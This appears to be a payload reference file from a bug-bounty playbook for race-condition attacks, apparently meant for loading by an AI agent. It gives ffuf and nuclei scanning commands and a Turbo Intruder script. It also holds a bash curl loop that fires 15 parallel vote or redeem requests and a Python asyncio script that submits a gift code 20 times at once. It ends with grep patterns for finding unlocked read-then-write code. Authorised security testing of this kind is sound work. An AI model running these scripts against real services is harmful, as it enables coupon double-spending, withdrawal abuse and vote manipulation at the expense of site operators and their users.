# Race Condition — Combined Field Guide — Payload reference

Moved out of `SKILL.md` to keep the main playbook lean. Load this file when you need concrete payload.

---

## Payloads & probes



- Single-packet attack: 20-30 requests in one HTTP/2 packet

- Last-byte sync: hold final byte, release together

- Repeat the same coupon/withdrawal across parallel connections



## Payload fragments observed



Recurring payloads from this class's writeups. Adapt, don't paste blindly.



| Seen | Fragment |

|---:|---|

| 9× | `Curl_dnscache_add_negative()` |

| 5× | `Curl_dnscache_add()` |

| 5× | `std::fs::remove_dir_all()` |

| 5× | `Curl_fopen()` |

| 4× | `Curl_hash_add()` |

| 4× | `Curl_hsts_save()` |

| 3× | `data:` |

| 3× | `stat()` |

| 3× | `dnscache_lock()` |

| 3× | `dnscache_add_addr()` |

| 3× | `Curl_hsts_parse()` |

| 3× | `curlx_gmtime()` |

| 3× | `Curl_close()` |

| 2× | `x-request: %s` |

| 2× | `Buffer.from()` |

| 2× | `share->cookies` |

| 2× | `remove_dir_all()` |

| 2× | `hsts_out()` |

| 2× | `--hsts <file>` |

| 1× | `https://sandbox.reverb.com/<lang>/redeem` |



## Parameters observed



`client_id` · `redirect_uri` · `code` · `invite` · `client_secret` · `token` · `commit` · `response_type` · `term` · `raw_json` · `id` · `authenticity_token` · `search` · `new` · `dl` · `access_token` · `refresh_token` · `defid` · `direction` · `key`



## Wordlists



Mined from this class's writeups and ready for `ffuf`/`feroxbuster`. Paths and parameters recur across programs; verify each hit.



| File | Entries |

|---|---:|

| `~/.local/share/hackerone-reports/wordlists/paths_race-condition.txt` | 61 |

| `~/.local/share/hackerone-reports/wordlists/params_race-condition.txt` | 36 |

| `~/.local/share/hackerone-reports/wordlists/paths.txt` (global) | 500 |

| `~/.local/share/hackerone-reports/wordlists/params.txt` (global) | 400 |



```sh

W=~/.local/share/hackerone-reports/wordlists

ffuf -u https://target/FUZZ -w $W/paths_race-condition.txt \

     -mc all -fc 404 -fs 0 -rate 40

ffuf -u 'https://target/api?FUZZ=canary' -w $W/params_race-condition.txt \

     -mr 'canary|error|invalid|not found' -rate 40

```



## Nuclei



No reliable scanner. Use Turbo Intruder single-packet or last-byte sync on check-then-act flows.



```sh

nuclei -u https://target -tags race-condition \

       -severity low,medium,high,critical -rl 40 -o nuclei_race-condition.txt

# authenticated surface: add -H 'Cookie: session=...' or -H 'Authorization: Bearer ...'

```



Triage every hit by hand: a template match is a lead, not a finding. Update templates with `nuclei -update-templates`.



## Payload & Detection Patterns



### Turbo Intruder — Basic Parallel Race

```python

# turbo_intruder_race.py

def queueRequests(target, wordlists):

    engine = RequestEngine(endpoint=target.endpoint,

                           concurrentConnections=1,

                           engine=Engine.BURP2)  # HTTP/2 single-packet

    for i in range(20):

        engine.queue(target.req, gate='race1')

    engine.openGate('race1')



def handleResponse(req, interesting):

    if '200' in req.status:

        table.add(req)

```



### curl — Parallel Requests (bash)

```bash

# Fire 15 simultaneous vote/redeem requests

for i in $(seq 1 15); do

  curl -s -o /dev/null -w "%{http_code}\n" \

    -X POST "https://target.com/api/vote" \

    -H "Cookie: session=YOUR_SESSION" \

    -H "Content-Type: application/json" \

    -d '{"report_id": "12345", "vote": "up"}' &

done

wait

```



### Python asyncio Race

```python

import asyncio, aiohttp



async def race_request(session, url, payload, headers):

    async with session.post(url, json=payload, headers=headers) as r:

        return await r.text()



async def main():

    url = "https://target.com/redeem"

    payload = {"code": "GIFT50"}

    headers = {"Cookie": "session=XXXXX"}

    

    async with aiohttp.ClientSession() as session:

        tasks = [race_request(session, url, payload, headers) for _ in range(20)]

        results = await asyncio.gather(*tasks)

    

    for r in results:

        print(r[:100])  # print first 100 chars of each response



asyncio.run(main())

```



### Grep Patterns for Source Code Auditing

```bash

# Look for read-then-write without locking

grep -rn "find_by\|where.*first" --include="*.rb" | grep -v "lock"

grep -rn "SELECT.*WHERE" --include="*.php" | grep -v "FOR UPDATE"



# JavaScript async without atomicity

grep -rn "await.*get\|await.*find" --include="*.js" -A2 | grep "await.*update\|await.*save"



# Python Django ORM without select_for_update

grep -rn "\.get(\|\.filter(" --include="*.py" | grep -v "select_for_update"

```



### HTTP/2 Single-Packet Check

```bash

# Verify target supports HTTP/2 (prerequisite for single-packet attack)

curl -sI --http2 https://target.com | grep -i "HTTP/2\|h2"

```



---
